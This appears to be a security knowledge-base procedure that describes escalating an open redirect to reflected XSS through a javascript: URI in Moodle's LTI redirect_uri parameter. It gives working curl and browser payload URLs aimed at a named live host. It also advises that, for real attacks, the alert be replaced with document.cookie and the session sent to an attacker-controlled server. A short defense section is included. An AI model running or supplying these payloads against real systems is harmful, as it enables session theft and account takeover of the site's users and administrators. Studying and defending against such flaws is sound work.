---
tags:
  - xss
  - reflected-xss
  - moodle
  - lti
  - javascript-uri
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/test-moodle-xss-payload-with-curl]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 27e371d3-de39-4a96-b5b0-27a482efc710
created_at: '2025-12-13T23:52:39.018Z'
updated_at: '2025-12-13T23:52:39.018Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Escalate Open Redirect to Reflected XSS in Moodle LTI

## Summary

This procedure exploits the lack of sanitization in the Moodle LTI redirect_uri parameter by injecting a javascript: URI scheme, leading to reflected XSS that executes arbitrary JavaScript in the victim's browser and enables session cookie theft.

## Description

Building on the open redirect, the endpoint reflects the redirect_uri without escaping javascript: schemes, allowing browser execution of payloads like javascript:alert(document.domain). Discovered on evolve.glovoapp.com, this allows attackers to steal cookies from admins or users, bypassing access controls and enabling account takeover. The impact includes unauthorized access to Moodle features and data.

## Requirements

1. Confirmed open redirect from prior procedure
2. curl for response inspection
3. Web browser to trigger JavaScript execution
4. Target access on port 443

## Defense

Defensive measures and detection strategies:

- Sanitize redirect_uri to strip or block javascript: and data: schemes
- Implement output encoding for reflected parameters
- Enable strict CSP to prevent inline script execution
- Monitor user-agent strings and unusual redirects in logs

## Objectives

1. Inject and execute JavaScript payload
2. Demonstrate cookie theft potential
3. Highlight escalation from redirect to code execution

## Instructions

### Step 1: Inspect Response for Reflection

**Context**: Check if the javascript: payload is reflected in the response without sanitization, setting up for browser execution.

**Command** ([[commands/test-moodle-xss-payload-with-curl]]):
```bash
curl -i "https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)"
```

> Examine the response body for the unsanitized payload. If reflected as-is, proceed to browser testing; no execution occurs in curl.

### Step 2: Trigger Execution in Browser

**Context**: Visit the payload URL to execute the JavaScript in the context of the Moodle domain.

Construct and navigate to: https://evolve.glovoapp.com/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)

> An alert should pop up showing the domain. For real attacks, replace with document.cookie to exfiltrate sessions via a beacon to an attacker-controlled server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/test-moodle-xss-payload-with-curl]]

## Tools Used


## Tags

- xss
- reflected-xss
- javascript-uri
